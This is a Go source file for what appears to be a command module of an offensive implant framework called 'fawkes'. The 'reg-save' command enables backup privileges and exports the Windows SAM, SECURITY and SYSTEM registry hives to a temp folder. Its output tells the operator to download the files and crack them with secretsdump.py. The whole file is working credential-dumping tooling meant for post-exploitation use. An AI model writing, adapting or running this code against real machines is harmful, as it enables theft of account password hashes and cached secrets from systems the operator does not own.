//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	procRegSaveKeyExW = advapi32HD.NewProc("RegSaveKeyExW")
)

// RegSaveCommand exports registry hives to files for offline analysis
type RegSaveCommand struct{}

func (c *RegSaveCommand) Name() string {
	return "reg-save"
}

func (c *RegSaveCommand) Description() string {
	return "Export registry hives to files for offline credential extraction (requires SYSTEM privileges)"
}

type regSaveArgs struct {
	Action string `json:"action"`
	Hive   string `json:"hive"`
	Path   string `json:"path"`
	Output string `json:"output"`
}

func (c *RegSaveCommand) Execute(task structs.Task) structs.CommandResult {
	var args regSaveArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "save"
	}

	// Enable SeBackupPrivilege
	enableBackupPrivilege()
	enableThreadBackupPrivilege()

	switch args.Action {
	case "save":
		return regSaveHive(args.Hive, args.Path, args.Output)
	case "creds":
		return regSaveCredentialHives(args.Output)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use save, creds)", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// regSaveHive exports a single registry hive/key to a file
func regSaveHive(hive, path, output string) structs.CommandResult {
	if hive == "" || path == "" || output == "" {
		return structs.CommandResult{
			Output:    "Required: -hive (HKLM, HKCU, etc.), -path (e.g., SAM, SYSTEM), -output (file path)",
			Status:    "error",
			Completed: true,
		}
	}

	rootKey, err := resolveHive(hive)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Invalid hive: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Remove output file if it exists (RegSaveKeyEx fails if file exists)
	os.Remove(output)

	// Open the key with backup semantics
	hKey, err := regOpenKey(rootKey, path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open %s\\%s: %v\nEnsure you are running as SYSTEM (use 'getsystem' first).", hive, path, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer regCloseKey(hKey)

	// Save the key to file
	outputPtr, _ := windows.UTF16PtrFromString(output)
	ret, _, err := procRegSaveKeyExW.Call(
		hKey,
		uintptr(unsafe.Pointer(outputPtr)),
		0, // No security attributes
		2, // REG_LATEST_FORMAT
	)
	if ret != 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("RegSaveKeyEx failed for %s\\%s → %s: %v (code %d)", hive, path, output, err, ret),
			Status:    "error",
			Completed: true,
		}
	}

	// Get file size
	fi, statErr := os.Stat(output)
	sizeStr := "unknown size"
	if statErr == nil {
		sizeStr = formatRegSaveSize(fi.Size())
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Saved %s\\%s → %s (%s)\nUse 'download %s' to retrieve the file.", hive, path, output, sizeStr, output),
		Status:    "success",
		Completed: true,
	}
}

// regSaveCredentialHives exports SAM, SECURITY, and SYSTEM hives for offline credential extraction
func regSaveCredentialHives(outputDir string) structs.CommandResult {
	if outputDir == "" {
		outputDir = `C:\Windows\Temp`
	}

	hives := []struct {
		path string
		file string
		desc string
	}{
		{"SAM", "sam.hiv", "Local account hashes"},
		{"SECURITY", "security.hiv", "LSA secrets, cached creds"},
		{"SYSTEM", "system.hiv", "Boot key (required for decryption)"},
	}

	var sb strings.Builder
	sb.WriteString("Credential Hive Export:\n\n")
	saved := 0

	for _, h := range hives {
		outPath := outputDir + `\` + h.file
		os.Remove(outPath) // RegSaveKeyEx fails if file exists

		hKey, err := regOpenKey(hkeyLocalMachine, h.path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] %s: open failed — %v\n", h.path, err))
			continue
		}

		outputPtr, _ := windows.UTF16PtrFromString(outPath)
		ret, _, saveErr := procRegSaveKeyExW.Call(
			hKey,
			uintptr(unsafe.Pointer(outputPtr)),
			0,
			2, // REG_LATEST_FORMAT
		)
		regCloseKey(hKey)

		if ret != 0 {
			sb.WriteString(fmt.Sprintf("[!] %s: save failed — %v\n", h.path, saveErr))
			continue
		}

		fi, _ := os.Stat(outPath)
		size := "unknown"
		if fi != nil {
			size = formatRegSaveSize(fi.Size())
		}

		sb.WriteString(fmt.Sprintf("[+] %s → %s (%s) — %s\n", h.path, outPath, size, h.desc))
		saved++
	}

	sb.WriteString(fmt.Sprintf("\nSaved: %d/3 hives\n", saved))
	if saved > 0 {
		sb.WriteString(fmt.Sprintf("\nUse 'download <path>' to retrieve each file.\n"))
		sb.WriteString("Offline extraction: secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL\n")
	}

	status := "success"
	if saved == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func resolveHive(hive string) (uintptr, error) {
	switch strings.ToUpper(hive) {
	case "HKLM", "HKEY_LOCAL_MACHINE":
		return hkeyLocalMachine, nil
	case "HKCU", "HKEY_CURRENT_USER":
		return uintptr(0x80000001), nil
	case "HKCR", "HKEY_CLASSES_ROOT":
		return uintptr(0x80000000), nil
	case "HKU", "HKEY_USERS":
		return uintptr(0x80000003), nil
	default:
		return 0, fmt.Errorf("unknown hive: %s (use HKLM, HKCU, HKCR, HKU)", hive)
	}
}

func formatRegSaveSize(bytes int64) string {
	if bytes < 1024 {
		return fmt.Sprintf("%d B", bytes)
	} else if bytes < 1024*1024 {
		return fmt.Sprintf("%.1f KB", float64(bytes)/1024)
	}
	return fmt.Sprintf("%.1f MB", float64(bytes)/(1024*1024))
}
